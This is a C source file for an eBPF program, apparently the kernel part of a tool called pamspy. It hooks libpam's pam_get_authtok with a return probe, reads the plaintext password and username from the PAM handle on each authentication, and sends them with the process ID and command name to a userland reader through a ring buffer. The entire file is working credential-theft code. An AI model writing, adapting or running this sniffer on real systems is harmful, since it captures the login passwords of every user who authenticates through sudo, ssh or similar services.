// SPDX-License-Identifier: BSD-3-Clause
#include "vmlinux.h"
#include "pamspy_event.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "Dual BSD/GPL";

/******************************************************************************/
/*!
 *  \brief  dump from source code of libpam
 *          This is a partial header
 */
typedef struct pam_handle
{
  char *authtok;
  unsigned caller_is;
  void *pam_conversation;
  char *oldauthtok;
  char *prompt; /* for use by pam_get_user() */
  char *service_name;
  char *user;
  char *rhost;
  char *ruser;
  char *tty;
  char *xdisplay;
  char *authtok_type; /* PAM_AUTHTOK_TYPE */
  void *data;
  void *env; /* structure to maintain environment list */
} pam_handle_t;

/******************************************************************************/
/*!
 *  \brief  ring buffer use to communicate with userland process
 */
struct
{
  __uint(type, BPF_MAP_TYPE_RINGBUF);
  __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

/******************************************************************************/
/*!
 *  \brief  main userland return probe program
 *  
 *  int pam_get_authtok(pam_handle_t *pamh, int item,
 *                         const char **authtok, const char *prompt);
 *
 */

SEC("uretprobe/pam_get_authtok")
int trace_pam_get_authtok(struct pt_regs *ctx)
{
  if (!PT_REGS_PARM1(ctx))
    return 0;

  pam_handle_t* phandle = (pam_handle_t*)PT_REGS_PARM1(ctx);

  // Get current PID to track
  u32 pid = bpf_get_current_pid_tgid() >> 32;

  // retrieve output parameter
  u64 password_addr = 0;
  bpf_probe_read(&password_addr, sizeof(password_addr), &phandle->authtok);

  u64 username_addr = 0;
  bpf_probe_read(&username_addr, sizeof(username_addr), &phandle->user);

  event_t *e;
  e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
  if (e)
  {
    e->pid = pid;
    bpf_probe_read(&e->password, sizeof(e->password), (void *)password_addr);
    bpf_probe_read(&e->username, sizeof(e->username), (void *)username_addr);
    bpf_get_current_comm(&e->comm, sizeof(e->comm));
    bpf_ringbuf_submit(e, 0);
  }
  return 0;
};
